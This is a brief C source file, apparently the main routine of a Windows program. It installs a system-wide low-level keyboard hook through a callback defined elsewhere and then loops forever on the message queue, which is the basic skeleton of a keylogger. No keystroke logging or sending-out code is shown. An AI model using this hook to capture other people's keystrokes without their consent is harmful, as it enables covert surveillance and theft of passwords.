#include "utils.h"

int main()
{
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KBCallBack, NULL, NULL);
	MSG mess;

	while (true)
		GetMessage(&mess, NULL, NULL, NULL);

	return 0;
}